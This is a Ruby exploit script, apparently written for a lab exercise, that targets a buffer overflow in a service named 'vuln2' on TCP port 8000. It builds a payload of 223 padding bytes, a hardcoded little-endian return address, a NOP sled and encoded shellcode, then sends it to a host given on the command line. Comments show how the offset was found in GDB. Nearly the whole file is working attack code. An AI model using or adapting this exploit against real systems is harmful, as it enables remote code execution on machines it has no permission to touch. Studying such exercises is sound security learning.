#!/usr/bin/ruby

#Exploit the buffer overflow vulnerability in 'vuln2'

require 'socket'


#The function to generate n bytes of non repeating pattern of characters
def genpattern(n)
    pat = ""
    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.each_char do |i|
        'abcdefghijklmnopqrstuvwxyz'.each_char do |j|
            '0123456789'.each_char do |k|
                pat << i + j + k
            end
        end
    end
    return pat.slice(0,n)
end
             
host = ARGV[0]

sock = TCPSocket.open(host, 8000) #Like connect in python

#Get and print banner 
puts sock.recv(1024)

#Shell code for TCP using the venom generating process
shellcode = 
"\xb8\xcb\xb0\x40\xb8\xdb\xd6\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x14\x31\x42\x14\x83\xea\xfc\x03\x42\x10\x29\x45\x71" +
"\x63\x5a\x45\x21\xd0\xf7\xe0\xc4\x5f\x16\x44\xae\x92\x58" +
"\xfe\x71\x7f\x30\x03\x8e\x5e\x23\x69\x9e\xf1\xf3\xe7\x7f" +
"\x9b\x95\xaf\xb2\xdc\xd0\x11\x49\x6e\xe6\x21\x37\x5d\x66" +
"\x02\x08\x3b\xab\x05\xfb\x9d\x59\x39\xa4\xd0\x1d\x0c\x2d" +
"\x13\x75\xa0\xe2\x90\xed\xd6\xd3\x34\x84\x48\xa5\x5a\x06" +
"\xc6\x3c\x7d\x16\xe3\xf3\xfe"

#Generate overflowing input
#buf = 'A'*1024 #Overflows the server got offset of 223
#Make all letter A's then four B's where it should be then C's after that and if B's are
#where they should be then we're right! (should only have B's in eip (4 hex -> 16 bit) 
#Trying with the real return address and NOP sled and simple shellcode
#Remember to follow little endianness
#buf = 'A'*223 + "\xe8\xf4\xff\xbf" + "\x90"*32 + "\xcc"*(1024-223-4-32)

#buf = 'A'*223 + "\xe8\xf4\xff\xbf" + "\x90"*32 + shellcode IN GDB
buf = 'A'*223 + "\x08\xf5\xff\xbf" + "\x90"*32 + shellcode #OUT OF IN GDB

puts "Sending input"
sock.print buf

puts sock.recv(1024)
sock.close
